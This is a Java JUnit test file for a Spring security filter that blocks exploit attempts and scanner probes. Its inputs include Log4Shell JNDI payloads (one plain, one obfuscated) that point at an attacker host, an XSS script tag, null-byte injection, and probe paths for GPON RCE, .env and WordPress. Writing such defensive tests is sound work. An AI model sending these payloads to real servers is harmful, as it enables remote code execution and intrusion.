package com.github.farzadsedaghatbin.shipflow.security;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.mockito.Mockito.*;

import jakarta.servlet.FilterChain;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.util.Collections;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.test.util.ReflectionTestUtils;
import org.mockito.junit.jupiter.MockitoSettings;
import org.mockito.quality.Strictness;

/**
 * Tests for {@link MaliciousHeaderFilter} - security filter that blocks exploit
 * attempts. Verifies detection of Log4Shell, XSS, and other attack vectors.
 */
@ExtendWith(MockitoExtension.class)
@MockitoSettings(strictness = Strictness.LENIENT)
class MaliciousHeaderFilterTest {

  private MaliciousHeaderFilter filter;

  @Mock
  private HttpServletRequest request;

  @Mock
  private HttpServletResponse response;

  @Mock
  private FilterChain filterChain;

  private StringWriter responseWriter;

  @BeforeEach
  void setUp() throws Exception {
    ClientIpService clientIpService = new ClientIpService();
    ReflectionTestUtils.setField(clientIpService, "trustedProxiesRaw", "127.0.0.1,::1");
    ReflectionTestUtils.invokeMethod(clientIpService, "initTrustedProxies");
    filter = new MaliciousHeaderFilter(clientIpService);
    responseWriter = new StringWriter();
    // lenient: not all tests call getWriter() (e.g. pass-through tests that don't write an error body)
    lenient().when(response.getWriter()).thenReturn(new PrintWriter(responseWriter));
  }

  @Test
  void shouldBlockLog4ShellAttack() throws Exception {
    // Given: A request with Log4Shell JNDI injection payload
    String maliciousPayload = "${jndi:ldap://evil.com:1389/Exploit}";
    when(request.getHeaderNames())
        .thenReturn(Collections.enumeration(Collections.singletonList("X-Forwarded-Host")));
    when(request.getHeader("X-Forwarded-Host")).thenReturn(maliciousPayload);
    when(request.getRequestURI()).thenReturn("/api/qa/ask");
    when(request.getMethod()).thenReturn("POST");
    when(request.getRemoteAddr()).thenReturn("31.57.109.131");

    // When: Filter processes the request
    filter.doFilter(request, response, filterChain);

    // Then: Request is blocked with 400 Bad Request
    verify(response).setStatus(HttpServletResponse.SC_BAD_REQUEST);
    verify(response).setContentType("application/json");
    verify(filterChain, never()).doFilter(any(), any());
    assertEquals("{\"error\":\"Malicious request detected and blocked\"}", responseWriter.toString());
  }

  @Test
  void shouldBlockObfuscatedLog4ShellAttack() throws Exception {
    // Given: An obfuscated Log4Shell attack (like in production logs)
    String maliciousPayload = "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//31.57.109.131:3306/Exploit}";
    when(request.getHeaderNames())
        .thenReturn(Collections.enumeration(Collections.singletonList("X-Forwarded-Host")));
    when(request.getHeader("X-Forwarded-Host")).thenReturn(maliciousPayload);
    when(request.getRequestURI()).thenReturn("/api/qa/ask");
    when(request.getMethod()).thenReturn("POST");
    when(request.getRemoteAddr()).thenReturn("31.57.109.131");

    // When: Filter processes the request
    filter.doFilter(request, response, filterChain);

    // Then: Request is blocked
    verify(response).setStatus(HttpServletResponse.SC_BAD_REQUEST);
    verify(filterChain, never()).doFilter(any(), any());
  }

  @Test
  void shouldBlockXSSAttack() throws Exception {
    // Given: A request with XSS payload in header
    String maliciousPayload = "<script>alert('XSS')</script>";
    when(request.getHeaderNames()).thenReturn(Collections.enumeration(Collections.singletonList("User-Agent")));
    when(request.getHeader("User-Agent")).thenReturn(maliciousPayload);
    when(request.getRequestURI()).thenReturn("/api/qa/ask");
    when(request.getMethod()).thenReturn("GET");
    when(request.getRemoteAddr()).thenReturn("192.168.1.100");

    // When: Filter processes the request
    filter.doFilter(request, response, filterChain);

    // Then: Request is blocked
    verify(response).setStatus(HttpServletResponse.SC_BAD_REQUEST);
    verify(filterChain, never()).doFilter(any(), any());
  }

  @Test
  void shouldBlockLDAPProtocol() throws Exception {
    // Given: A request with LDAP protocol in header
    String maliciousPayload = "ldap://malicious.server.com/payload";
    when(request.getHeaderNames()).thenReturn(Collections.enumeration(Collections.singletonList("Referer")));
    when(request.getHeader("Referer")).thenReturn(maliciousPayload);
    when(request.getRequestURI()).thenReturn("/api/qa/ask");
    when(request.getMethod()).thenReturn("GET");
    when(request.getRemoteAddr()).thenReturn("192.168.1.100");

    // When: Filter processes the request
    filter.doFilter(request, response, filterChain);

    // Then: Request is blocked
    verify(response).setStatus(HttpServletResponse.SC_BAD_REQUEST);
    verify(filterChain, never()).doFilter(any(), any());
  }

  @Test
  void shouldBlockNullByteInjection() throws Exception {
    // Given: A request with null byte injection
    String maliciousPayload = "legitimate%00malicious";
    when(request.getHeaderNames())
        .thenReturn(Collections.enumeration(Collections.singletonList("X-Forwarded-Host")));
    when(request.getHeader("X-Forwarded-Host")).thenReturn(maliciousPayload);
    when(request.getRequestURI()).thenReturn("/api/qa/ask");
    when(request.getMethod()).thenReturn("GET");
    when(request.getRemoteAddr()).thenReturn("192.168.1.100");

    // When: Filter processes the request
    filter.doFilter(request, response, filterChain);

    // Then: Request is blocked
    verify(response).setStatus(HttpServletResponse.SC_BAD_REQUEST);
    verify(filterChain, never()).doFilter(any(), any());
  }

  @Test
  void shouldBlockGponRouterExploitPath() throws Exception {
    // Given: A POST to the GPON router RCE path (CVE-2018-10561 / CVE-2018-10562)
    // Note: getHeaderNames() is NOT stubbed - the filter blocks this path before the header loop
    when(request.getRequestURI()).thenReturn("/GponForm/diag_Form");
    when(request.getMethod()).thenReturn("POST");
    when(request.getRemoteAddr()).thenReturn("45.33.32.156");

    // When: Filter processes the request
    filter.doFilter(request, response, filterChain);

    // Then: Request is rejected with 403 Forbidden, not escalated to DispatcherServlet
    verify(response).setStatus(HttpServletResponse.SC_FORBIDDEN);
    verify(response).setContentType("application/json");
    verify(filterChain, never()).doFilter(any(), any());
  }

  @Test
  void shouldBlockWordPressAdminProbe() throws Exception {
    // Given: A probe targeting WordPress admin panel (common bot scanner)
    when(request.getRequestURI()).thenReturn("/wp-admin/admin-ajax.php");
    when(request.getMethod()).thenReturn("POST");
    when(request.getRemoteAddr()).thenReturn("103.0.0.1");

    // When: Filter processes the request
    filter.doFilter(request, response, filterChain);

    // Then: Request is rejected with 403
    verify(response).setStatus(HttpServletResponse.SC_FORBIDDEN);
    verify(filterChain, never()).doFilter(any(), any());
  }

  @Test
  void shouldBlockDotEnvProbe() throws Exception {
    // Given: A probe for the .env secrets file
    when(request.getRequestURI()).thenReturn("/.env");
    when(request.getMethod()).thenReturn("GET");
    when(request.getRemoteAddr()).thenReturn("103.0.0.2");

    // When: Filter processes the request
    filter.doFilter(request, response, filterChain);

    // Then: Request is rejected with 403
    verify(response).setStatus(HttpServletResponse.SC_FORBIDDEN);
    verify(filterChain, never()).doFilter(any(), any());
  }

  @Test
  void shouldBlockCryptoExchangeProbe() throws Exception {
    // Given: A crypto exchange API probe (common in mass scanning)
    when(request.getRequestURI()).thenReturn("/mms-api/coins/hot/tickers");
    when(request.getMethod()).thenReturn("POST");
    when(request.getRemoteAddr()).thenReturn("185.0.0.1");

    // When: Filter processes the request
    filter.doFilter(request, response, filterChain);

    // Then: Request is rejected with 403
    verify(response).setStatus(HttpServletResponse.SC_FORBIDDEN);
    verify(filterChain, never()).doFilter(any(), any());
  }

  @Test
  void shouldBlockJoinRoomProbe() throws Exception {
    // Given: A chat room scanner probe
    when(request.getRequestURI()).thenReturn("/join_room");
    when(request.getMethod()).thenReturn("POST");
    when(request.getRemoteAddr()).thenReturn("185.0.0.2");

    // When: Filter processes the request
    filter.doFilter(request, response, filterChain);

    // Then: Request is rejected with 403
    verify(response).setStatus(HttpServletResponse.SC_FORBIDDEN);
    verify(filterChain, never()).doFilter(any(), any());
  }

  @Test
  void shouldBlockGamblingVipDomainProbe() throws Exception {
    // Given: A gambling/VIP domain probe
    when(request.getRequestURI()).thenReturn("/site/api/v1/site/vipExclusiveDomain/getGuestDomain");
    when(request.getMethod()).thenReturn("POST");
    when(request.getRemoteAddr()).thenReturn("185.0.0.3");

    // When: Filter processes the request
    filter.doFilter(request, response, filterChain);

    // Then: Request is rejected with 403
    verify(response).setStatus(HttpServletResponse.SC_FORBIDDEN);
    verify(filterChain, never()).doFilter(any(), any());
  }

  @Test
  void shouldBlockRelayApiProbe() throws Exception {
    // Given: A relay API scanner probe
    when(request.getRequestURI()).thenReturn("/relayApi/api/notice/site_setting");
    when(request.getMethod()).thenReturn("POST");
    when(request.getRemoteAddr()).thenReturn("185.0.0.4");

    // When: Filter processes the request
    filter.doFilter(request, response, filterChain);

    // Then: Request is rejected with 403
    verify(response).setStatus(HttpServletResponse.SC_FORBIDDEN);
    verify(filterChain, never()).doFilter(any(), any());
  }

  @Test
  void shouldBlockMalwareInstallerProbe() throws Exception {
    // Given: Malware installer probe with typo (as seen in real attacks)
    when(request.getRequestURI()).thenReturn("/instatll?tag=matto");
    when(request.getMethod()).thenReturn("POST");
    when(request.getRemoteAddr()).thenReturn("185.0.0.5");

    // When: Filter processes the request
    filter.doFilter(request, response, filterChain);

    // Then: Request is rejected with 403
    verify(response).setStatus(HttpServletResponse.SC_FORBIDDEN);
    verify(filterChain, never()).doFilter(any(), any());
  }

  @Test
  void shouldBlockBizServerConfigProbe() throws Exception {
    // Given: A config exposure probe
    when(request.getRequestURI()).thenReturn("/biz/server/config");
    when(request.getMethod()).thenReturn("POST");
    when(request.getRemoteAddr()).thenReturn("185.0.0.6");

    // When: Filter processes the request
    filter.doFilter(request, response, filterChain);

    // Then: Request is rejected with 403
    verify(response).setStatus(HttpServletResponse.SC_FORBIDDEN);
    verify(filterChain, never()).doFilter(any(), any());
  }

  @Test
  void shouldBlockPhpFileProbeViaSuspiciousPattern() throws Exception {
    // Given: A .php file probe not in the explicit prefix list
    when(request.getRequestURI()).thenReturn("/some/random/page.php");
    when(request.getMethod()).thenReturn("GET");
    when(request.getRemoteAddr()).thenReturn("185.0.0.7");

    // When: Filter processes the request
    filter.doFilter(request, response, filterChain);

    // Then: Request is rejected with 403 (caught by regex pattern)
    verify(response).setStatus(HttpServletResponse.SC_FORBIDDEN);
    verify(filterChain, never()).doFilter(any(), any());
  }

  @Test
  void shouldAllowLegitimateApiRequest() throws Exception {
    // Given: A normal authenticated API call
    when(request.getHeaderNames())
        .thenReturn(Collections.enumeration(Collections.singletonList("Authorization")));
    when(request.getHeader("Authorization")).thenReturn("Bearer eyJhbGciOiJIUzI1NiJ9.valid.token");
    when(request.getRequestURI()).thenReturn("/api/projects");
    when(request.getRemoteAddr()).thenReturn("10.0.0.1");

    // When: Filter processes the request
    filter.doFilter(request, response, filterChain);

    // Then: Request passes through to the next filter
    verify(filterChain).doFilter(request, response);
    verify(response, never()).setStatus(anyInt());
  }

  @Test
  void shouldAllowLegitimateStaticResource() throws Exception {
    // Given: A legitimate SPA route request
    when(request.getHeaderNames())
        .thenReturn(Collections.enumeration(Collections.singletonList("Accept")));
    when(request.getHeader("Accept")).thenReturn("text/html");
    when(request.getRequestURI()).thenReturn("/dashboard");
    when(request.getRemoteAddr()).thenReturn("10.0.0.2");

    // When: Filter processes the request
    filter.doFilter(request, response, filterChain);

    // Then: Request passes through
    verify(filterChain).doFilter(request, response);
    verify(response, never()).setStatus(anyInt());
  }
}
